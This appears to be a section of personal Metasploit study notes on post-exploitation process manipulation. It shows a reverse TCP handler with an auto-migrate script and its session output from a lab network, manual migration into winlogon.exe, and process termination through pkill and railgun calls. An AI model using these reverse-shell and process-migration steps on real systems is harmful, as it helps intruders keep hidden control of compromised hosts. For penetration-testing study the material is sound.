# 04 - Process Manipulation

Search Tag(s): #metasploit-framework #command-and-control #interactive-shell

## 4.1 - Migrate to Another Process

* Setting up listener to auto migrate to another process

```
msf exploit(multi/handler) > set lhost 10.0.2.4

msf exploit(multi/handler) > set lport 4444

msf exploit(multi/handler) > set autorunscript post/windows/manage/migrate name=notepad.exe

msf exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.0.2.4:4444 
[*] Sending stage (200262 bytes) to 10.0.2.15
[*] Session ID 4 (10.0.2.4:4444 -> 10.0.2.15:49840 ) processing AutoRunScript 'post/windows/manage/migrate name=notepad.exe'
[*] Running module against DEFALT
[*] Current server process: powershell.exe (1136)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[*] Migrating into 1280
[+] Successfully migrated into process 1280
[*] Meterpreter session 4 opened (10.0.2.4:4444 -> 10.0.2.15:49840 ) at 2022-05-15 15:35:51 -0400
```

* Migrate to another process

```
meterpreter > migrate -h
Usage: migrate <<pid> | -P <pid> | -N <name>> [-t timeout]

Migrates the server instance to another process.
NOTE: Any open channels or other dynamic state will be lost.

meterpreter > migrate <pid>

meterpreter > migrate -N <process_name>

meterpreter > migrate -N winlogon.exe
[*] Migrating from 4980 to 412...
[*] Migration completed successfully.
```

## 4.2 - Get Process ID

```
meterpreter > getpid
Current pid: 1280
```

## 4.3 - Terminate Process

### 4.3.1 - Process ID

Terminate process ID.

```
meterpreter > kill <pid>
```

We'll create a new handle by retrieving the process ID. Then define a process handle `_['return']` after the conditions has been met. Terminate by calling the railgun function with zero exit code as an indication the process has been killed.

```
meterpreter > irb

>> client.railgun.kernel32.OpenProcess("PROCESS_TERMINATE", false, <pid>)

>> process_handle = _['return'] -> define a process handle

>> client.railgun.kernel32.TerminateProcess(process_handle, 0)
```

### 4.3.1 - Process Name

```
meterpreter > pkill <process_name>
```